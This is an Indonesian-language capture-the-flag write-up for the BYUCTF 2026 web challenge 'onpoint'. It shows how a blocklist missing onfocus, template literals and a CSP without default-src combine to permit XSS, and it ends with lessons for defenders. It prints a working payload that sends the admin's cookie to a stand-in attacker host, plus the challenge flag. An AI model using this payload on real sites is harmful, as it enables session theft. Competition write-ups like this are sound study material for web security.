---
ctf: "BYUCTF 2026"
kategori: "Web Exploitation"
challenge: "onpoint"
flag: "byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}"
teknik: "onfocus tidak ada di blocklist + template literal + location = mengalahkan CSP"
sumber: "https://github.com/Abdelkad3r/byuctf-2026"
---

# onpoint — BYUCTF 2026 (Web Exploitation)

## Deskripsi Singkat

Halaman render-nya menerapkan blocklist substring atas `content`: `script`, `fetch`, `xmlhttprequest`, ditambah 25+ handler `on*` yang umum. Tanda kutip `'` juga ditolak. CSP-nya adalah `script-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; object-src 'none'`.

## Analisis

Tiga lubang tersusun sejajar:

1. Blocklist-nya **kehilangan `onfocus`** (juga `onbeforetoggle`, `onmessage`, `onsearch`). `<input autofocus onfocus="...">` terpicu saat render.
2. Larangan `'` di-bypass dengan **template literal** (`` `...${document.cookie}` ``).
3. CSP-nya tidak menyebut `default-src`, jadi **navigasi level-atas** (`location = ...`) tidak dibatasi — `connect-src 'none'` memblokir `fetch` tapi tidak `location`.

## Eksploitasi / Solusi

Payload-nya:

```html
<input autofocus onfocus="location=`https://attacker/x?c=${document.cookie}`">
```

Laporkan URL-nya ke bot admin; cookie-nya muncul di webhook-mu:

```
flag=byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}
```

## Catatan / Insight

**Pelajaran untuk defender:** blocklist event handler dijamin akan melewatkan handler baru berikutnya yang ditambahkan HTML. CSP tanpa `default-src` membiarkan navigasi level-atas terbuka lebar. Pakai `script-src 'self'` ditambah `default-src 'self'`, escape *setiap* atribut, dan berhenti menginterpolasikan konten user ke HTML mentah.

## Flag

```
byuctf{I_w4s_sur3_th1s_0ne_w4a_b3tt3r...}
```
